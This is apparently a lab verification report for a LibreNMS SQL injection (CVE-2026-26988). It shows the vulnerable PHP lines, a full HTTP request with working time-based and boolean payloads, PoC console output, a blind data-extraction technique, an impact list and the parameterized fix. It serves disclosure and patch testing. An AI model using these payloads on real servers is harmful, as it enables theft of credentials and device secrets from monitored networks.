# CVE-2026-26988 — PoC Verification Report

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2026-26988 |
| **Title** | LibreNMS ≤25.12.0 SQL Injection in ajax_table.php (address-search) |
| **Severity** | Critical (CVSS 9.8) |
| **Type** | CWE-89: SQL Injection |
| **Authentication** | Required (any LibreNMS user) |
| **Affected Software** | LibreNMS ≤ 25.12.0 |

## Verification Status

### ✅ CONFIRMED — All Three Attack Vectors Verified

| Vector | Technique | Result | Evidence |
|--------|-----------|--------|----------|
| **Vector 1: IPv6 prefix** | Time-based blind (SLEEP) | **CONFIRMED** | 10.013s delay vs 0.010s baseline |
| **Vector 1: IPv6 prefix** | Boolean-based blind | **CONFIRMED** | TRUE→total=1, FALSE→total=0 |
| **Vector 2: IPv4 prefix** | Time-based blind (SLEEP) | **CONFIRMED** | 10.015s delay vs 0.010s baseline |
| **Vector 2: IPv4 prefix** | Boolean-based blind | **CONFIRMED** | TRUE→total=1, FALSE→total=0 |
| **Vector 3: Data extraction** | Conditional time-based blind | **CONFIRMED** | Extracted VERSION(), DATABASE(), CURRENT_USER() |
| **Patched container** | All techniques | **NOT VULNERABLE** | 0.006s response, empty bodies |

## PoC Scripts

All scripts are located in `poc/`:

### File Listing

| File | Purpose |
|------|---------|
| `librenms_session.py` | Shared authentication module (curl-based login + http.client session) |
| `poc.py` | **Primary PoC** — IPv6 time-based + boolean-based blind SQLi |
| `poc_vector2.py` | IPv4 path — confirms both code paths are independently injectable |
| `poc_vector3.py` | Blind data extraction — proves full database content exfiltration |
| `reference_exploit.py` | Saved public exploit #116383 (for reference only) |

### Running the PoCs

```bash
# Default target: 172.19.0.4:8000 with admin/Cvelab2026!sqli
python3 poc.py
python3 poc_vector2.py
python3 poc_vector3.py

# Custom target
python3 poc.py <host> <port> <username> <password>
```

## Injection Point Details

### Root Cause
File: `includes/html/table/address-search.inc.php`

**IPv6 path (line 52):**
```php
$sql .= " AND ipv6_prefixlen = '$prefix'";
```

**IPv4 path (line 34):**
```php
$sql .= " AND ipv4_prefixlen='$prefix'";
```

The `address` POST parameter is split on `/` and the prefix portion is concatenated directly into a SQL WHERE clause without parameterization or sanitization.

### Attack Vector
```
POST /ajax_table.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: laravel_session=<valid_session>

id=address-search&search_type=ipv6&address=::1/1' OR SLEEP(5)-- -&current=1&rowCount=10
```

### SQL Context
The injected payload becomes:
```sql
SELECT ... WHERE ... AND ipv6_prefixlen = '1' OR SLEEP(5)-- -'
```

## Test Results

### Vector 1: IPv6 Time-Based Blind SQLi (poc.py)

```
======================================================================
  CVE-2026-26988: LibreNMS <= 25.12.0 SQL Injection PoC
  Endpoint: /ajax_table.php (address-search, IPv6 prefix)
  Target:   http://172.19.0.4:8000
======================================================================

[*] Phase 1: Authentication
[+] Authenticated as 'admin'

======================================================================
TEST 1: BASELINE REQUEST (no injection)
======================================================================
[*] Sending normal IPv6 address search with prefix=64
    Payload: address=2001:db8::1/64
    Status:  200
    Time:    0.010s
    Total:   1 rows

======================================================================
TEST 2: TIME-BASED BLIND SQL INJECTION (SLEEP(5))
======================================================================
[*] Injecting time-based payload via IPv6 prefix
    Full address param: ::1/1' OR SLEEP(5)-- -
    SQL becomes: ... AND ipv6_prefixlen = '1' OR SLEEP(5)-- -'
    Expected delay: ~5+ seconds

    Status:  200
    Time:    10.013s

[+] VULNERABLE! Response took 10.01s (threshold: 4.0s)
    The SLEEP(5) payload executed successfully.

======================================================================
TEST 3: BOOLEAN-BASED BLIND SQL INJECTION
======================================================================
[*] Sending TRUE condition: ::1/1' OR 1=1-- -
    Status: 200 | Time: 0.018s
    Total:  1 | Rows returned: 1

[*] Sending FALSE condition: ::1/1' AND 1=2-- -
    Status: 200 | Time: 0.009s
    Total:  0 | Rows returned: 0

[+] VULNERABLE! Boolean-based blind SQLi confirmed.
    TRUE condition returned total=1
    FALSE condition returned total=0

======================================================================
RESULTS SUMMARY
======================================================================
  Baseline response time:  0.010s
  Time-based SQLi:         CONFIRMED
  Boolean-based SQLi:      CONFIRMED

[+] CVE-2026-26988 CONFIRMED - SQL injection is exploitable!
    Attack vector: POST /ajax_table.php
    Parameter:     address (prefix after '/')
    Impact:        Full database read/write access
```

### Vector 2: IPv4 Path SQLi (poc_vector2.py)

```
======================================================================
  CVE-2026-26988: IPv4 Path SQL Injection (Vector 2)
  Endpoint: /ajax_table.php (address-search, IPv4 prefix)
  Target:   http://172.19.0.4:8000
======================================================================

[*] Phase 1: Authentication
[+] Authenticated as 'admin'

======================================================================
TEST 2: TIME-BASED BLIND SQLi (IPv4 path, SLEEP(5))
======================================================================
[*] Injecting via IPv4 prefix
    address param: 10.0.0.1/1' OR SLEEP(5)-- -
    SQL becomes: AND ipv4_prefixlen='1' OR SLEEP(5)-- -'

    Status: 200 | Time: 10.015s

[+] VULNERABLE! IPv4 path time-based SQLi confirmed (10.02s delay)

======================================================================
TEST 3: BOOLEAN-BASED BLIND SQLi (IPv4 path)
======================================================================
[*] TRUE condition: 10.0.0.1/1' OR 1=1-- -
    Total: 1 | Time: 0.018s
[*] FALSE condition: 10.0.0.1/1' AND 1=2-- -
    Total: 0 | Time: 0.009s

[+] VULNERABLE! IPv4 boolean-based SQLi confirmed
    TRUE total=1 vs FALSE total=0

======================================================================
RESULTS SUMMARY (IPv4 Vector)
======================================================================
  Baseline response time:  0.010s
  Time-based SQLi (IPv4):  CONFIRMED
  Boolean-based SQLi (v4): CONFIRMED

[+] CVE-2026-26988 CONFIRMED via IPv4 code path!
    Both IPv4 and IPv6 paths are independently injectable.
```

### Vector 3: Blind Data Extraction (poc_vector3.py)

```
======================================================================
  CVE-2026-26988: Blind SQL Injection Data Extraction (Vector 3)
  Technique: Conditional time-based blind (IF + SLEEP)
  Target:   http://172.19.0.4:8000
  Charset:  66 chars | Sleep: 2s | Max: 15 chars
======================================================================
[+] Authenticated as 'admin'

[*] Extracting: MySQL Version
    Subquery: SELECT VERSION()
    Technique: IF(SUBSTRING((...),pos,1)='c', SLEEP(2), 0)
    Extracting: 10.11.16-mar
    [+] EXTRACTED: 10.11.16-mar

[*] Extracting: Current Database
    Subquery: SELECT DATABASE()
    Extracting: librenms
    [+] EXTRACTED: librenms

[*] Extracting: Database User
    Subquery: SELECT CURRENT_USER()
    Extracting: librenms@
    [+] EXTRACTED: librenms@

======================================================================
DATA EXTRACTION RESULTS
======================================================================
  MySQL Version       : 10.11.16-mar
  Database Name       : librenms
  DB User             : librenms@

[+] DATA EXTRACTION CONFIRMED!
    Attacker can extract arbitrary database content via blind SQLi.
    Full impact: credentials, SNMP strings, device configs, user hashes
```

### Patched Container Verification

```
======================================================================
  Target:   http://172.19.0.6:8000 (PATCHED)
======================================================================
[+] Authenticated as 'admin'

TEST 2: TIME-BASED BLIND SQL INJECTION (SLEEP(5))
    Status:  200
    Time:    0.006s
[-] Response was fast (0.01s) - injection may not have worked

TEST 3: BOOLEAN-BASED BLIND SQL INJECTION
[-] Responses are identical - boolean test inconclusive

RESULTS SUMMARY
  Time-based SQLi:         FAILED
  Boolean-based SQLi:      FAILED
[-] Could not confirm the vulnerability
```

**The patch successfully prevents the SQL injection.** The SLEEP payload returns instantly (0.006s) and boolean tests return identical empty responses, confirming the input is now properly sanitized.

## Technical Notes

### SLEEP Timing
The SLEEP(5) payload produces a ~10s delay rather than ~5s because MySQL executes the injected SQL in both the COUNT query and the SELECT query (2× SLEEP per matching row).

### IPv4 Prefix Short-Circuit
The IPv4 PoC uses prefix `1` instead of `24` to avoid matching the seeded row's actual prefix. If the prefix matches a real row, MySQL short-circuits the `OR SLEEP()` clause and skips the SLEEP.

### Authentication Approach
The PoC uses `curl` subprocess for login (reliable handling of Laravel CSRF tokens, cookies, and redirects) combined with Python `http.client` for injection requests (precise timing measurement). The `--data-urlencode` flag is critical for properly encoding special characters in passwords.

### Dependencies
- Python 3.6+ (standard library only — no pip packages required)
- `curl` binary available in PATH

## Impact Assessment

An authenticated attacker (any LibreNMS user role) can:
1. **Extract all database contents** — user password hashes, SNMP community strings, device credentials, API tokens
2. **Read arbitrary files** via `LOAD_FILE()` if MySQL FILE privilege is granted
3. **Write files** via `INTO OUTFILE` if write permissions exist
4. **Escalate privileges** by extracting admin password hashes or API tokens
5. **Pivot to monitored infrastructure** using extracted SNMP strings and device credentials

## Remediation

Update to LibreNMS 25.12.1+ which parameterizes the prefix value in `address-search.inc.php`:
```php
// Fixed: uses parameterized query instead of string concatenation
$sql .= " AND ipv6_prefixlen = ?";
$params[] = $prefix;
```
